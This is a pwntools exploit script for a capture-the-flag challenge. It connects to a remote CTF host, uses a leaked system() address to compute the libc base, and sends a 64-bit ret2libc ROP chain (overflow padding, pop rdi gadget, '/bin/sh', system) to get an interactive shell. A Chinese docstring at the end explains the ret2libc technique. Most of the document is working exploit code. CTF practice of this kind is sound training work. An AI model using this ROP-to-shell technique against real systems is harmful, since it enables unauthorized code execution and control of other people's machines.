from pwn import *

# context(arch = 'amd64',os = 'linux',log_level = 'debug')

p = remote('pwn.challenge.ctf.show', 28251)
libc = ELF('./libc.so.6')

p.recvuntil("Maybe it's simple,O.o\n")

system = int(p.recvline(),16)

log.success(hex(system))

libcbase = system - libc.sym['system']
bin_sh_addr = libcbase + next(libc.search('/bin/sh'))
pop_rdi = libcbase + 0x2164f
ret = libcbase + 0x8aa

payload = cyclic(136) + p64(pop_rdi) + p64(bin_sh_addr) + p64(ret) + p64(system)

p.send(payload)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2libc - 返回libc库函数
2. 核心原理：
   - 程序没有后门函数，但动态链接了libc
   - 利用栈溢出跳转到libc中的函数（如system）
   - 需要泄露libc地址或已知libc版本
3. 利用方式：
   - 泄露libc地址：通过GOT表泄露函数地址，计算libc基址
   - 直接利用：程序提供libc地址或已知libc版本
4. 关键步骤：
   - 泄露libc函数地址（如puts、write）
   - 使用LibcSearcher识别libc版本
   - 计算system和/bin/sh地址
   - 构造ROP链调用system("/bin/sh")
5. 注意：64位需要pop_rdi gadget传递参数
"""
